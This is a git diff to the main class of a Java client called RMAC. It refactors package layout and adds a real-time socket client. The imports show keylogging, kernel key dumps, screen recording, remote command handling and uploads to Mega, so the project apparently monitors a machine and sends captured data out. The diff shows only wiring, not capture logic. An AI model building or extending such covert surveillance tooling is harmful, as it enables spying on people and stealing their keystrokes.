@@ -1,17 +1,18 @@
 package com.rmac;
 
+import com.rmac.comms.SocketClient;
 import com.rmac.core.Archiver;
-import com.rmac.core.CommandHandler;
+import com.rmac.process.CommandHandler;
 import com.rmac.core.Config;
 import com.rmac.core.FileUploader;
-import com.rmac.core.KernelDump;
-import com.rmac.core.KeyLog;
+import com.rmac.process.KernelDump;
+import com.rmac.process.KeyLog;
 import com.rmac.core.KeyRecorder;
 import com.rmac.core.MegaClient;
-import com.rmac.core.ScreenRecorder;
+import com.rmac.process.ScreenRecorder;
 import com.rmac.core.ScriptFiles;
 import com.rmac.core.Service;
-import com.rmac.ipc.SocketServer;
+import com.rmac.comms.IPC;
 import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Commands;
 import com.rmac.utils.Constants;
@@ -37,7 +38,7 @@ import org.slf4j.LoggerFactory;
  *   <li>Verifies the runtime directory and its files (ffmpeg, megacmd, svcl, config, jre etc.)</li>
  *   <li>Tries to acquire a lock for this RMACClient instance to make sure only one instance is running</li>
  *   <li>Loads the configuration.</li>
- *   <li>Creates SocketServer to establish comms with RMACUpdater process.</li>
+ *   <li>Creates IPC to establish comms with RMACUpdater process.</li>
  *   <li>Initializes FileUploader process</li>
  *   <li>Initializes Archiver and uploads any pending archives from previous run in a threaded process.</li>
  *   <li>Generates script files</li>
@@ -61,8 +62,9 @@ public class RMAC {
   public static KeyLog keyLog;
   public static KeyRecorder keyRecorder;
   public static Archiver archiver;
-  public static SocketServer ipcInterface;
+  public static IPC ipcInterface;
   public static KernelDump kernelDumpsUploader;
+  public static SocketClient client;
 
   // Global flags
   public static boolean isClientRegistered = false;
@@ -119,8 +121,8 @@ public class RMAC {
 
     // Copy RMAC Native DLL from jar to Runtime location
     NATIVE_POSSIBLE = this.copyDLL();
-    // Create SocketServer and start listening for connection
-    ipcInterface = (SocketServer) this.getInstance(SocketServer.class);
+    // Create IPC and start listening for connection
+    ipcInterface = (IPC) this.getInstance(IPC.class);
     ipcInterface.start();
     // Initialize FileUploader
     uploader = (FileUploader) this.getInstance(FileUploader.class);
@@ -146,6 +148,9 @@ public class RMAC {
     // Initialize RMAC Kernel Key Dumps Uploader
     kernelDumpsUploader = (KernelDump) this.getInstance(KernelDump.class);
     kernelDumpsUploader.start();
+    // Initialize RMAC RT Client
+    client = (SocketClient) this.getInstance(SocketClient.class);
+    client.start();
 
     log.info("RMAC client initialized successfully");
 
